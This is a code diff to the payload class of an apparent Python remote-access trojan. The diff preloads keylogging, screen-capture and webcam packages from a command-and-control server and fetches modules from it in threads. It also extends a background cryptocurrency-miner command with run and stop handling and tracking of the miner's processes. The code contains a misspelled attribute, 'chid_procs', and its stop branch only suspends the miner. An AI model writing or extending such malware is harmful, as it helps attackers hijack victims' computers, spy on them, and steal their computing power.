@@ -13,6 +13,7 @@ import ctypes
 import ftplib
 import struct
 import socket
+import signal
 import logging
 import functools
 import threading
@@ -97,7 +98,7 @@ class Payload():
 
         """
         self.handlers = {}
-        self.remote = {'modules': [], 'packages': []}
+        self.remote = {'modules': [], 'packages': ['cv2','requests','pyHook','pyxhook','twilio','mss']}
         self.gui = True if kwargs.get('gui') else False
         self.owner = kwargs.get('owner')
         self.flags = self._get_flags()
@@ -168,7 +169,7 @@ class Payload():
         self.connection.sendall(msg)
         return info
 
-
+    @threaded
     def _get_resources(self, target=None, base_url=None):
         if sys.version_info[0] < 3:
             from urllib import urlretrieve
@@ -532,7 +533,7 @@ class Payload():
         return globals()['icloud'].run()
 
 
-    @config(platforms=['linux','linux2','darwin'], command=True, usage='miner <url> <user> <pass>')
+    @config(platforms=['linux','linux2','darwin'], command=True, usage='miner <cmd> [url] [user] [pass]')
     def miner(self, args):
         """
         Run cryptocurrency miner in the background
@@ -542,19 +543,44 @@ class Payload():
         :param str username:    username for mining server
         :param str password:    password for mining server
 
+
         """
         if 'miner' not in globals():
             self.load('miner')
+        
         args = str(args).split()
-        if len(args) == 3:
-            url, username, password = args
-            try:
-                globals()['miner'].run(url, username, password)
-                return """Miner running in background\nURL: {0}\nUser: {1}""".format(url, username)
-            except Exception as e:
-                return "{} error: {}".format(self.miner.__name__, str(e))
-        else:
-            return "usage: {}".format(self.miner.usage)
+
+        if len(args) == 4:
+            cmd, url, username, password  = args
+
+            if cmd == 'run':
+                try:
+                    # run miner (module forks and returns PID of child process)
+                    pid = globals()['miner'].run(url, username, password)
+
+                    # add PID to child procs
+                    if 'miner' not in self.child_procs:
+                        self.child_procs['miner'] = []
+                    self.child_procs['miner'].append(pid)
+
+                    return """Miner running in background\nPID: {0}""".format(pid)
+                except Exception as e:
+                    return "{} error: {}".format(self.miner.__name__, str(e))
+
+        elif len(args) == 1:
+            cmd = args[0]
+
+            if cmd == 'stop':
+                if 'miner' in self.chid_procs and len(self.child_procs['miner']):
+                    for pid in self.child_procs['miner']:
+                        try:
+                            os.kill(pid, signal.SIGSTOP)
+                        except OSError as e:
+                            log("{} error: {}".format(self.miner.__name__, str(e)))
+                else:
+                    return "Miner is not running."
+
+        return "usage: {}".format(self.miner.usage)
 
 
     @config(platforms=['win32','linux','linux2','darwin'], command=True, usage='upload [file]')
@@ -1059,8 +1085,8 @@ class Payload():
         host, port = self.connection.getpeername()
 
         # run 2 threads which remotely load packages/modules from c2 server
-        self._get_resources(target=self.remote['modules'], base_url='http://{}:{}'.format(host, port + 1))
-        self._get_resources(target=self.remote['packages'], base_url='http://{}:{}'.format(host, port + 2))
+        self.handlers['module_handler'] = self._get_resources(target=self.remote['modules'], base_url='http://{}:{}'.format(host, port + 1))
+        self.handlers['package_handler'] = self._get_resources(target=self.remote['packages'], base_url='http://{}:{}'.format(host, port + 2))
         self.handlers['prompt_handler'] = self._get_prompt_handler() if not self.gui else None
         self.handlers['thread_handler'] = self._get_thread_handler()
 
